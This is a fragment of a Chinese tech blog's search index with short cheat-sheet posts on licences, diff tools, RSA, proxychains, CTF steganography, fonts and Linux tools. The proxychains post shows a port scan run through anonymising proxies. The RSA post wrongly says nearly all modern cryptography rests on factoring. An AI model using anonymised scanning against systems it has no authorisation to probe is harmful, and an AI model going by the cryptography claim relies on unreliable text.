    <title><![CDATA[树莓派初体验]]></title>
    <url>%2F2018%2F12%2F24%2Fraspberry-pi-experience%2F</url>
    <content type="text"><![CDATA[Raspbian]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用BOINC来挖掘格雷德币]]></title>
    <url>%2F2018%2F12%2F16%2Fboinc-gridcoin%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[数字货币中的相关术语]]></title>
    <url>%2F2018%2F12%2F16%2Fdigital-currency%2F</url>
    <content type="text"><![CDATA[命名挖矿矿池钱包其他]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[编写Wikipedia的几点注意]]></title>
    <url>%2F2018%2F12%2F16%2Fwikipedia%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用GitBook编写电子书籍]]></title>
    <url>%2F2018%2F12%2F16%2Fgitbook%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[高级搜索技巧]]></title>
    <url>%2F2018%2F11%2F20%2Fadvanced-search-tips%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[身份认证的几种方式]]></title>
    <url>%2F2018%2F11%2F16%2Fauthentication%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[正则表达式小记]]></title>
    <url>%2F2018%2F11%2F12%2Fregex%2F</url>
    <content type="text"><![CDATA[正则表达式，即Regular Expression，直译为描述某种规则的表达式，通常被简写为regex或RE，是指使用单个字符串来描述、匹配一系列符合某个句法规则的字符串。 基本语法 ?：匹配前一个字符0次或1次 +：匹配前一个字符1次或多次 *：匹配前一个字符0次、1次或多次 |：代表选择（即或集），具有最低优先级 ()：用来定义操作符的范围和优先级 [abc]：匹配任何一个列在方括号中的字符，在这个例子中，要么匹配一个a，要么匹配一个b，要么匹配一个c [0-9]：如果在方括号中使用短划线分隔两个字符，表示所有在这两个字符范围内的都可以匹配，在这个例子中，表示匹配所有0到9的数字 ^：匹配行的开头，如^abc表示匹配以abc开始的一行]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[编写规范的README文档]]></title>
    <url>%2F2018%2F11%2F02%2Freadme%2F</url>
    <content type="text"><![CDATA[代码不仅是写给计算机的，也是写给人的，一篇文档的好坏直接影响着使用此代码的人的心情，针对小的项目，一般使用README文件来做整体描述，README这个名字也极好的反映了此文件的目的，即“读我”。有趣的是，README这6个字母通常都是大写的，这是因为在Linux中大写的文件名往往意味着醒目和值得注意。实际上，并没有任何人规定README文档应该写成什么样子，但在本文中，我将介绍一些被公认的所谓优秀的README文档应该是什么样子的。README文档通常是用Markdown编写的，但有时你也会看到其他格式的README文档，比如：有关Python的项目喜欢用reStructuredText编写README文档，这也是一种类似于Markdown的标记语言。一个优秀的README文档中应包含：简短的项目说明、安装说明、使用说明、如何参与贡献、许可协议等。此外，随着代码量的增加，已知BUG、常见问题等也可以加入到README文档中。 一个规范的README文档模板应该像下面这样的：12345678910# Project Name填写简短的项目说明# Installation填写安装说明# Usage填写使用说明# Contributing填写如何参与此项目的贡献方法# License填写许可协议 有趣的是，在日常使用中，经常会见到各种各样的徽章或进度条，比如：它们的本质就是一个个的图片而已，要想自定义这些图片可以访问Shields.io或progressed.io。 最后，我将给出几个GitHub中项目的文档，它们的README文档都写得不错： Rails factory_bot Walle Ledbetter Create-Your-Own-Adventure can.viewify]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[开源协议漫谈]]></title>
    <url>%2F2018%2F11%2F02%2Fopen-sourse-license%2F</url>
    <content type="text"><![CDATA[开源协议（Open Source License）往往又被称为开源许可证，世界上的开源协议大约有上百种，但最常见的也无非6种而已，即GPL、LGPL、Mozilla、Apache、BSD和MIT，下文将逐个介绍，此外，本文还介绍了CC BY-NC-SA协议。 GPLGPL全称GNU General Public License，即GNU通用公共许可协议，这是由GNU开源组织发起的，目前最新版是3.0。 LGPLLGPL全称GNU Lesser General Public License，即GNU宽通用公共许可证，这也是由GNU开源组织发起的，目前最新版是3.0。 MozillaMozilla Public License简称MPL，这是由Mozilla开源组织发起的，目前最新版是2.0。 ApacheApache License是由Apache开源组织发起的，目前最新版是2.0。 BSDBSD License是由加州大学伯克利分校发起的， MITMIT License是由麻省理工学院发起的 CC BY-NC-SACC BY-NC-SA 4.0全称Creative Commons-Attribution-Noncommercial-ShareAlike，即创作共享-署名-非商业性-相同方式共享，这是由创作共享组织发起的，目前最新版是4.0。 作何选择？如何简单快速的选择自己所需的开源协议呢？乌克兰程序员Paul Bagwell制作了一张分析图，国内程序员阮一峰根据此图制作出了中文版，图片如下（摘选自阮一峰博客如何选择开源许可证？）：此外，https://choosealicense.com/ 是一个不错的网站，它使你通过回答一些问题来选择合适的开源协议。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[如何比较两个文件之间的差异]]></title>
    <url>%2F2018%2F10%2F19%2Fdiff%2F</url>
    <content type="text"><![CDATA[Windows在Windows下，可以使用系统自带的fc命令（即file compare的缩写），比如fc game_old.js game_new.js，结果如下：12345678910111213141516171819202122232425262728正在比较文件 game_old.js 和 GAME_NEW.JS***** game_old.jsKEY_CODES = &#123; 32: &apos;space&apos;,***** GAME_NEW.JSKEY_CODES = &#123; 13: &apos;enter&apos;, 32: &apos;space&apos;,********** game_old.js 37: &apos;left&apos;, 38: &apos;up&apos;, 39: &apos;right&apos;,***** GAME_NEW.JS 37: &apos;left&apos;, 39: &apos;right&apos;,********** game_old.js if (KEY_STATUS.up) &#123; var rad = ((this.rot-90) * Math.PI)/180;***** GAME_NEW.JS if (KEY_STATUS.spacr) &#123; var rad = ((this.rot-90) * Math.PI)/180;***** 可见，fc命令会把两个文件中不同的片段显示出来，并分别标注属于哪个文件。输入fc /?可以查看fc命令的更多参数。 Linux在Linux下，可以使用系统自带的diff命令（即difference的缩写），它要比Windows中的fc命令更为强大，比如diff -u game_old.js game_new.js，其中-u参数表示使用标准区别格式，这将使输出内容更容易阅读，结果如下：12345678910111213141516171819202122--- game_old.js 2018-10-19 11:31:58.054834600 +0800+++ game_new.js 2018-10-19 11:32:19.667759500 +0800@@ -4,9 +4,9 @@ // KEY_CODES = &#123;+ 13: &apos;enter&apos;, 32: &apos;space&apos;, 37: &apos;left&apos;,- 38: &apos;up&apos;, 39: &apos;right&apos;, 40: &apos;down&apos;, 70: &apos;f&apos;,@@ -392,7 +392,7 @@ this.vel.rot = 0; &#125;- if (KEY_STATUS.up) &#123;+ if (KEY_STATUS.spacr) &#123; var rad = ((this.rot-90) * Math.PI)/180; this.acc.x = 0.5 * Math.cos(rad); this.acc.y = 0.5 * Math.sin(rad); 可见，diff命令的输出结果更加丰富，开始它展示了正在比较的2个文件，紧接着它显示了不同之处，其中-开始的段落代表只存在于前一个文件中，不存在于后一个文件中，同理，+开始的段落代表只存在于后一个文件中，不存在于前一个文件中，除此之外的所有段落代表共同存在于2个文件中。一般而言，我们将前一个文件表示为旧文件，后一个文件表示为新文件。输入diff --help可以查看diff命令的更多参数。 图形化程序或许使用像前面所述的命令行程序观察结果不是很方便，因此有些人可能会倾向于使用图形化程序，而Meld就是个不错的选择，它开源且跨平台，可用来可视化的观察文件之间的差异。使用Meld比较两文件差异的结果如下：可见，Meld用高亮显示文件之间的差异，同时它还提供了前往上一个/下一个差异的按钮，方便用户快速跳转。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA加密算法]]></title>
    <url>%2F2018%2F10%2F18%2Frsa%2F</url>
    <content type="text"><![CDATA[RSA加密算法中的3个字母分别是由此算法的3位发明者：Ron Rivest，Adi Shamir，Leonard Adleman的姓氏首字母组成的，RSA加密算法可以说是现代密码学中非对称加密的一个典型，所谓非对称加密其实就是公钥用于加密，私钥用于解密而已。在介绍RSA之前，先要理解一个基本常识，就是几乎所有的现代密码学算法背后都是基于因数分解难题发明的，所谓因数分解难题就是指目前没有一个快速的计算机算法可以对极大整数做因数分解。 公钥与私钥RSA加密算法通过如下步骤生成公钥和私钥： 随机选择2个不相等的质数p和q，计算p和q的乘积n取p=61，q=53，则n=3233 计算n的欧拉函数φ(n)φ(3233)=60×52=3120 随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n)互质，并计算e对于φ(n)的模反元素d取e=17，d=2753 将n和e封装成公钥，n和d封装成私钥公钥位(n, e)，私钥为(n, d) 加密与解密]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代理链工具：proxychains]]></title>
    <url>%2F2018%2F10%2F18%2Fproxychains%2F</url>
    <content type="text"><![CDATA[proxychains，顾名思义，是一种代理链工具，它可以强制任何Linux下的命令行应用使用其提供的代理连接到网络。Linux中有的应用本身并不支持代理，这时便可以使用proxychains强制其使用代理。 安装及使用在Ubuntu下可以使用sudo apt install proxychains直接安装，安装完成后会在/etc文件夹下生成proxychains.conf配置文件，在这个配置文件下可以配置代理链的工作模式和代理地址等。proxychains提供了3种代理模式，分别是动态链（dynamic_chain）、严格链（strict_chain）、随机链（random_chain），建议选择动态链。此外，proxychains默认设置的代理地址未为Tor的地址，但其实最新版的Tor已经更改端口为9150，用户可以根据自己的需求按照示例格式配置地址。配置完成后，要使用proxychains，只需在相应命令前加上proxychains即可，例如proxychains nmap -sS 192.168.1.1，即可强制nmap使用proxychains中设置的代理进行扫描。 与proxychains-ngproxychains-ng是proxychains的升级版，其中ng寓意为new generation（新一代），目前并不知晓proxychains-ng与proxychains是否为同一组织开发，但二者的配置与使用极为相似。在Ubuntu下可以使用sudo apt install proxychains-ng直接安装，要使用proxychains-ng，只需在相应命令前加上proxychains4即可。 Windows由于Windows与Linux的设计哲学不同，Linux偏向使用命令行，Windows偏向使用图形界面，所以proxychains并未提供Windows版。在Windows下可以使用另一款代理工具Proxifier，它可以看作是proxychains的图形界面版，值得注意的是，Proxifier是收费的，但你可以免费体验31天。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[盘点那些互联网公司的学生优惠]]></title>
    <url>%2F2018%2F09%2F26%2Fit-student-discount%2F</url>
    <content type="text"><![CDATA[JetBrainsJetBrains是捷克的一家软件公司，该公司专业生产各种编程语言的IDE，其中包括Java的IDE —— Intellij IDEA，Python的IDE —— PyCharm，JavaScript的IDE —— WebStorm，C/C++的IDE —— CLion等等。JetBrains系列的IDE一直以强大易用著称，甚至有人说，一个优秀的程序员应该使用JetBrains全家桶。JetBrains的大多数IDE都是收费的，有的分为社区版（Community Edition）和专业版（Professional Edition）两种，专业版相比社区版有更多的功能，但也会收取相应的费用，然而，JetBrains对学生提供免费授权计划，学生只要验证学生身份即可免费使用JetBrains的所有IDE。 Microsoft ImagineMicrosoft Imagine原名为DreamSpark，是微软为学生提供的一个资源集合，它包括了一些软件和服务，学生只要验证学生身份即可使用其中的工具。个人认为，Imagine相比之前的DreamSpark，为学生提供的免费资源少了许多。具体而言，它提供如下资源： Parallels Desktop for Mac Pro Edition：macOS上最好的虚拟机产品，提供免费试用3个月 Visual Studio Community 2017：原本就是免费的 面向学生的 Microsoft Azure 入门版 Microsoft虚拟学院课程：原本就是免费的 Pluralsight SQL Server 2017 Developer Edition Visual Studio Code：微软推出的编辑器，原本就是开源免费的 Visual Studio for Mac：原本就是免费的 Windows Embedded 8.1 Industry Pro Update Windows Server 2016 Windows应用商店免费开发人员帐户 WintellectNow Xamarin Studio Community Edition：原本就是免费的 Visual Studio的PHP Tools插件 GitHub Student Developer PackGitHub学生开发者包（GitHub Student Developer Pack）是GitHub与其他公司一起创建的，旨在让学生从一个地方免费访问最好的开发者工具，这样他们就可以边做边学。其中包括的工具有： Algolia Atom：GitHub推出的编辑器，原本就是开源免费的 AWS Bitnami CARTO CrowdFlower Datadog DigitalOcean：美国一家VPS提供商，提供50美元优惠劵 Flatiron School GitHub无限制的私人仓库：值得注意的是，2019年1月8号之后，GitHub宣布私人仓库也可以免费使用了，在此之前，私人仓库是要收费的。 Gitkraken：跨平台的Git GUI客户端，提供免费一年的专业帐户 HackHands Heroku：美国的一家PaaS厂商，提供一个长达2年的Hobby类型Dyno，Dyno是Heroku上所有应用程序的基本运行环境，Hobby类型的Dyno比免费的要稍微好一些，详细配置信息请参考官方文档 JetBrains系列IDE Namecheap：美国的一家域名注册商，提供免费一年SSL证书、一年.me后缀域名优惠 SendGrid Sentry Stripe Taplytics Thinkful Transifex Travis CI：一个流行的持续集成平台，针对开源项目免费，此学生包提供私有项目免费使用。 Unreal Engine 学生只要验证学生身份就可以使用GitHub学生开发者包中提供的工具。 阿里云云翼计划学生验证学生身份后，每月仅需9.9元即可租用一台阿里云服务器。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Jupyter Notebook常用扩展]]></title>
    <url>%2F2018%2F09%2F25%2Fjupyter-notebook-extensions%2F</url>
    <content type="text"><![CDATA[扩展机制在介绍常用扩展之前，有必要先来介绍一下Jupyter Notebook的扩展机制：本质上来说，所有的Jupyter Notebook扩展都是一个个的Python包，所以大部分可以通过pip快速安装，另外，Jupyter Notebook是一个典型的B/S架构的应用，用户通过访问浏览器来使用Jupyter Notebook，因此，Jupyter Notebook的插件可以只针对服务器端，也可以扩展前端资源页面，而如果一个插件扩展了Jupyter Notebook的前端资源页面，则它还必须使用如下命令安装资源：1jupyter nbextension install helpful_package --py # or --sys-prefix if using virtualenv or conda 安装完资源后，如果这个资源需要在每次Jupyter Notebook启动后被加载，则还应使用如下命令启用资源：1jupyter nbextension enable helpful_package --py # or --sys-prefix if using virtualenv or conda jupyter_contrib_nbextensions与其说这是一个插件，倒不如说这是一群插件，该插件集合了大多数的Jupyter Notebook常用扩展。使用pip install jupyter_contrib_nbextensions命令即可安装，安装完成后使用jupyter contrib nbextension install --user命令进行些许配置，参数--user指定安装到当前用户家目录下的.jupyter文件夹下。等到安装并配置完成后，打开Jupyter Notebook网页，会出现Nbextensions选项卡，点击进入此选项卡中，可以启用或禁用相应的插件。 RISE该插件可以将Jupyter Notebook中的一个个单元格转换为一张张的幻灯片。使用pip install RISE命令即可安装，安装完成后使用jupyter-nbextension install rise --py --sys-prefix命令安装前端资源，接着使用jupyter-nbextension enable rise --py --sys-prefix命令启用前端资源。 ##]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[editorconfig 是什么]]></title>
    <url>%2F2018%2F09%2F23%2Fwhat-is-editorconfig%2F</url>
    <content type="text"><![CDATA[开发同一项目的不同的人，可能会使用不同的编辑器，又会有不同的设置，这就会造成不同的代码格式，为了统一同一项目的代码格式，由此诞生了EditorConfig，它包含了一个用于定义代码格式的文件和一批编辑器插件，这些插件可以让编辑器读取配置文件并依此格式化代码。一个典型的 EditorConfig 配置文件如下所示：123456789101112131415161718192021222324252627282930313233# 这是一行注释，以#开头# 表示此文件为最顶级root = true# 设定每个文件每行以换行（LF）结束，文件末尾添加一个新行[*]end_of_line = lfinsert_final_newline = true# 匹配所有以 js 和 py 为后缀名的文件# 设定其编码为 UTF-8[*.&#123;js,py&#125;]charset = utf-8# 匹配所有以 py 为后缀名的文件，设定其缩进为 4 个空格[*.py]indent_style = spaceindent_size = 4# 设定 Makefile 文件的缩进为 Tab[Makefile]indent_style = tab# 匹配lib目录下所有以 js 为后缀名的文件，设定其缩进为 2 个空格[lib/**.js]indent_style = spaceindent_size = 2# 设定 package.json 和 .travis.yml 的缩进为 2 个空格[&#123;package.json,.travis.yml&#125;]indent_style = spaceindent_size = 2 此配置文件应该保存为.editorconfig并放置在项目目录中，编辑器的 EditorConfig 插件会从文件打开目录开始依次向其父级目录查找并读取配置文件，直到遇见root = true为止。有很多项目在初始化时都会生成相应的.editorconfig文件，比如 Angular。另外，Visual Studio 和 JetBrains 家的大部分 IDE 都已经原生支持了 EditorConfig，因此不用再安装插件；对于 Sublime Text 和 Vim 等未原生支持的编辑器，EditorConfig 官网提供了相应的插件下载地址。要了解详细的支持列表，请访问 EditorConfig 官网。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[写代码应该用哪种字体]]></title>
    <url>%2F2018%2F09%2F23%2Fcode-font%2F</url>
    <content type="text"><![CDATA[等宽字体与比例字体等宽字体（Monospaced）是指字符宽度相同的电脑字体，与此相对，字符宽度不尽相同的电脑字体称为比例字体（Proportional）。一图胜千言，如下：在早期的电脑中，由于技术的局限，无法进行字母宽度的比例调整，因此只能将每个字符都制作成一样的宽度，从而形成了等宽字体。在等宽字体中，字母 i，j 显得两侧余白较多，而字母 w，m 等的笔画显得相当拥挤。但是随着图形用户界面主流的更新和计算机技术的提高，处理比例字体的局限性得到了突破，因此现在排版上显得比较自然的比例字体的使用已经相当普及。这里所讨论的都是英文字体，对于中文字体而言，一般认为它们都是等宽的。Windows 中常用的等宽字体为 Consolas；macOS 中常用的等宽字体为 Menlo；Linux 中常用的等宽字体为 Mono。 衬线字体与非衬线字体顾名思义，衬线体（Serif）和无衬线体（Sans-Serif）的区别就在于有无衬线，而衬线则指的是字形笔画末端的装饰细节部分。一图胜千言，如下：这里所讨论的都是英文字体，对于简体中文字体而言，习惯性称衬线字体为宋体，非衬线字体为黑体，如下：衬线字体常用于印刷业，而且特别适用于长篇文章段落；非衬线字体简洁大方，适用于广告、标志、牌子等短句。另外，系统、程序和网页中的字体也几乎都是非衬线字体，即使是很长的段落，这是因为显示器分辨率低，字体不能减小，如果用衬线字体，那些边边角角就很难用像素显示清楚，结果反而不利于阅读。Google 在 2015 年就将其原本的衬线体 Logo 换成了无衬线体 Logo:我们在写 Word 文档时，常用的英文衬线字体就是 Times New Roman；而在做 PPT 时，个人倾向于使用非衬线字体微软雅黑。 编程写代码应该使用的字体对于衬线或非衬线要求不大，但强烈建议使用等宽字体，这样可以便于代码对齐，因为比例字体的宽度不定，这会对代码对齐造成极大的困难。另外，还应该对特殊字符有较高的辨识度，比如 I（大写i）、l（小写L）、1（数字1），0（数字0）、O（大写o） 等。最后，中文字符的宽度应该严格是英文字符宽度的2倍，在某些时候，你会发现这很有用。 基于以上，个人倾向于使用 be5invis 开发的 Sarasa-Gothic（更纱黑体）系列字体，它的前身便是 Inziu Iosevka 系列字体，现在已经迁移至 Sarasa-Gothic，推荐使用其中的 Sarasa Term SC 型字体。此外，这一系列字体都是开源免费的。 术语在下载某些字体时，可能会遇到相关术语，如下： mono：即 Monospaced，等宽字体 sans：即 Sans-Serif，无衬线体 gothic：哥特体，即无衬线体 bold：粗体 italic：斜体 bolditalic：加粗斜体 regular：常规体 sc：即 Simplified Chinese，简体中文 tc：即 Traditional Chinese，繁体中文 cl：即 Classical Literature，《康熙字典》字形 j：即 Japanese，日文 ligature：连体字符，举例来说，会把!=变成≠ 配色关于代码配色，就真是个“仁者见仁，智者见智”的问题了，个人要求满足以下两点： 采用黑色背景 官网提供多种编辑器的支持 综上，个人倾向于使用Dracula。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[开发环境代表什么]]></title>
    <url>%2F2018%2F09%2F23%2Fwhat-is-development-environment%2F</url>
    <content type="text"><![CDATA[按照编程语言的执行原理，一般将其分为编译型语言（如 C）和解释型语言（如 Python），对于编译型语言来说，它的开发环境就代表该语言的编译器和其基本类库，对于解释型语言来说，它的开发环境就代表该语言的解释器和其基本类库。请注意，这里我并没有提到编辑器，因为编辑器并不属于每种语言所特有的范畴。 对于解释型语言来说，它的开发环境就等于运行环境，而对于编译型语言，可以说它不需要运行环境。请注意，Java 可以理解为是一种先编译后解释的语言，所以运行 Java 程序之前需要安装 JRE（Java 运行环境）。 如今许多语言的 IDE（集成开发环境），已经集编辑器、该语言的编译器/解释器、基本类库等于一体。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[谈谈SEO]]></title>
    <url>%2F2018%2F09%2F23%2Ftalk-about-seo%2F</url>
    <content type="text"><![CDATA[SEO，即搜索引擎优化(Search Engine Optimization)，下面列出几点SEO方面的建议： 页面的URL应该足够反映页面的内容]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[隐写术]]></title>
    <url>%2F2018%2F09%2F22%2Fsteganography%2F</url>
    <content type="text"><![CDATA[第一步拿到一个被隐写的文件，第一步当然是判断该文件是哪种类型的文件，一般可以通过文件后缀名判断之，若不能通过文件后缀名判断，则可以使用 Linux 中的 file 命令，直接输入 file a即可检查 a 文件的类型。知道文件类型后，就可以对症下药，依据相应的类型使用相应的办法，此时，不妨再查看一下文件对应的二进制数据，所有电子信息的本质无非是二进制，可以在二进制数据中搜索CTF或FLAG等关键字，发现是否存在隐藏信息。Windows下可以使用Sublime Text 3 的插件HexViewer查看二进制信息。Linux 下可以使用 xxd 命令查看文件二进制数据。 图片隐写图片内容首先应该检查图片内容本身是否存在某些隐藏信息，遇到不熟悉的图片可以尝试谷歌搜图，或许可以发现更多信息。 ExifExif，即可交换图像文件格式(Exchangeable image file format)，可以记录JPEG格式图片的属性信息和拍摄数据。有的JPEG格式图片会具有Exif信息，在Windows中查看属性选项卡中的详细信息项即可查看。别的格式的图片不具备Exif信息。如下图片： JPEGPNGGIFBMP音频隐写音频隐写一般会用到MP3stego，该软件会将信息编码到 MP3 文件中，同时也可以从被隐写的 MP3 文件中解码所需信息。下载该软件后在其MP3Stego文件夹下会有 2 个命令：Encode和Decode，Encode命令用于隐写信息，Decode命令用于解密被隐写的信息，使用decode -X -P pass svega_stego.mp3即可从svega_stego.mp3文件中解码所需信息，-P指定解密密码。 视频隐写其他隐写Word 文档Word 文档可能会隐藏某些信息，遇到 doc 文档可以尝试在 Word 选项中选择显示并打开隐藏文字选项。如下所示：像 Word 文档或 Excel 表格这样的富文本文件，可以直接解压之，查看其中是否包含某些特殊文件。类似的题可以参考Fonts,认真你就输了等等。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微软平台技术简介]]></title>
    <url>%2F2018%2F09%2F22%2Fmicrosoft-technology%2F</url>
    <content type="text"><![CDATA[Windows微软最初的操作系统的DOS，DOS只是一个命令行形式，后来 .NETWindows Phone]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[网站统计与分析]]></title>
    <url>%2F2018%2F09%2F22%2Fweb-analytics%2F</url>
    <content type="text"><![CDATA[几个术语 PV：Page View，即页面浏览量或点击量，用户每次刷新即被计算一次。 UV：Unique Visitor，指独立访客数，以cookie为依据，访问网站的一台电脑客户端为一个访客。一天内相同的客户端只会被计算一次。 IP：指独立IP数。一天内相同IP地址只被计算一次。 相关工具有许多第三方的工具可以帮助站长统计和分析网站流量，比如百度统计、腾讯分析、Google Analytics(GA)等。个人经常使用Google Analytics。这类工具的原理大致为：它们会生成一段特定的JS代码，站长需要将这段代码插入到自己网站的页面中，当访客访问网站时，这段代码会收集访客的行为信息，并上传到它们的服务器上。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[版本号的意义]]></title>
    <url>%2F2018%2F09%2F21%2Fversion-number%2F</url>
    <content type="text"><![CDATA[软件版本号的确定没有一个统一的规范，但大都遵循一个固定的格式，即X.Y.Z格式，其中： X代表主版本号，一般当软件整体重写，或出现不向后兼容的改变等重大更新时，增加X，同时重置Y、Z为0，X为0时表示软件还在开发阶段； Y代表次版本号，增删功能时增加Y，同时重置Z为0； Z代表修订号，修复Bug时增加Z。 除此之外，还会有一些修饰词，比如： alpha表示内部测试版； beta表示公开测试版； rc即Release Candidate，表示候选版本，即将作为正式版发布； release表示正式发行版； lts即Long Term Support，表示长期支持版。 有的项目有自己的一套规则，比如Ubuntu、Visual Studio等，它们采用发布年份作为版本号；Node.js规定X为偶数的是稳定版，X为奇数的是开发版；TeX的版本号不断趋近于π。随着版本号定义的越来越混乱，GitHub起草了一个语义化版本(Semantic Versioning)规范，为开源项目做出了一定指导意义。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[top的增强版：htop]]></title>
    <url>%2F2018%2F09%2F19%2Fhtop-top%2F</url>
    <content type="text"><![CDATA[toptop是Linux下一个常用命令，用来监视系统的运行状况，类似于Windows的任务管理器，下图是top命令的运行界面：top的运行结果可以大致分为7个部分： 第1行显示了系统概况 第2行显示了进程概况 第3行显示了CPU概况 第4行显示了内存概况 第5行显示了Swap分区概况 第6行为空行，用以显示运行命令时输入的参数 剩下部分则为每个进程的详细信息 第1行 字符 含义 top - 系统概况 18:37:24 当前系统时间 up 130 days, 6:22, 系统已运行时间 1 user, 当前登录用户数 load average: 0.02, 0.04, 0.00 系统平均负载，三个数值分别为1分钟、5分钟、15分钟前到现在的平均值。 第2行 字符 含义 Tasks: 进程(任务)概况 23 total, 总进程数 1 running, 运行的进程数 22 sleeping, 睡眠的进程数 0 stopped, 停止的进程数 0 zombie 僵尸进程数 第3行 字符 含义 Cpu(s): CPU概况 3.7%us, 用户(user)进程占用CPU百分率 0.7%sy, 系统(system)进程占用CPU百分率 0.0%ni, 用户进程空间内改变过优先级(niced)的进程占用CPU百分比 95.7%id, CPU空闲(idle)率 0.0%wa, 等待(wait)IO的CPU时间百分比 0.0%hi, 硬中断(hardware interrupt)占用CPU的百分比 0.0%si, 软中断(software interrupt)占用CPU的百分比 0.0%st 第4行 字符 含义 Mem: 内存(memory)概况，数值以kb为单位 524288k total, 内存总量 278140k used, 内存使用量 246148k free, 内存空闲量 0k buffers 缓冲的内存量 第5行 字符 含义 Swap: Swap分区概况，数值以kb为单位 65536k total, Swap分区总量 65536k used, Swap分区使用量 0k free, Swap分区空闲量 28800k cached 缓冲的Swap分区量 剩下部分 字符 含义 PID 进程号 USER 进程创建者 PR 进程优先级 NI nice值。越小优先级越高，最小-20，最大20（用户设置最大19） VIRT 进程使用的虚拟(virtual)内存总量，单位kb。VIRT=SWAP+RES RES 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA SHR 共享(share)内存大小，单位kb S 进程状态。D=不可中断的睡眠状态，R=运行态，S=睡眠态，T=跟踪/停止态，Z=僵尸态 %CPU 进程占用CPU百分比 %MEM 进程占用内存百分比 TIME+ 进程运行时间 COMMAND 运行进程时所使用的命令 命令在top命令运行界面也可以输入相关命令，具体如下： q：退出top运行界面 P：以占据CPU百分比排序 M：以占据内存百分比排序 T：以累积占用CPU时间排序 s：修改刷新时间间隔，默认每隔3秒刷新信息。按下s键，然后按下数字，即可修改刷新时间间隔为你输入的数字，单位为秒。例如：按下s键，在按数字1键，即可实现每秒刷新一次 回车或空格：手动立即刷新 k：终止指定的进程。按下k键，再输入要杀死的进程的pid，再按回车键，选择信号类型，以数字标示，默认15为杀死，本步可省略直接按回车键（常用为-9） h：显示可输入的命令帮助菜单 htophtop是一款第三方的命令行工具，它可以被视为是top的增强版，在Ubuntu下可使用apt install htop命令安装，下图是htop命令的运行界面：当了解了top运行界面的各种参数的含义后，htop运行界面就变得不言而喻了，下面简要介绍一下可以在htop运行界面执行的相关命令： 优势综上所述，htop相比top有以下优势： 彩色标识CPU、内存、Swap分区 CPU、内存、Swap分区使用情况直观易懂 底部有命令提示 支持方向键选择进程]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[curl wget]]></title>
    <url>%2F2018%2F09%2F19%2Fcurl-wget%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[terminal与shell]]></title>
    <url>%2F2018%2F09%2F19%2Fterminal-shell%2F</url>
    <content type="text"><![CDATA[terminal，常被翻译为终端，一般指黑色的窗口，终端可以设置字体、大小、布局和颜色等。Windows中常见的第三方终端有ConEmu、Cmder等。 shell，有时也被翻译为壳层，通常指操作系统中位于用户与内核之间的一层，主要用于和用户交互，因此，shell分为两类：命令行界面（CLI）和图形用户界面（GUI）。现在所指的shell通常指命令行shell，Linux中常见的命令行shell有bash、Zsh等。 通俗点说，terminal属于外层，shell属于内层，terminal包裹着shell，输入进terminal的命令要由shell去解释执行。和terminal很像的一个东西叫console，常被翻译为控制台，它也是一个黑色的窗口，用来输入命令，但与terminal不同的是，console与物理相关，且具有唯一性。举例来说，没有图形界面的Linux开机后，显示在屏幕上的就是console，它是与这台电脑相关的，且只有一个；而有图形界面的Linux开机后，打开的黑色窗口就是terminal，你可以打开多个。 在Windows中，这一切有点混乱，具体就表现在：那个黑色的窗口应该叫命令提示符还是控制台窗口？就如下图所示：首先，命令提示符的本意指的是命令行前面的提示符，在Linux中常被称为prompt，如下所示：显然，在Windows中，命令提示符指的是一种解释执行命令的shell，此外，控制台窗口应该指的是终端。因此，在Windows中有两种shell，即命令提示符和PowerShell，它们都共用了同一终端，即控制台窗口。这么理解的原因可参考微软的官方文档，摘录如下： 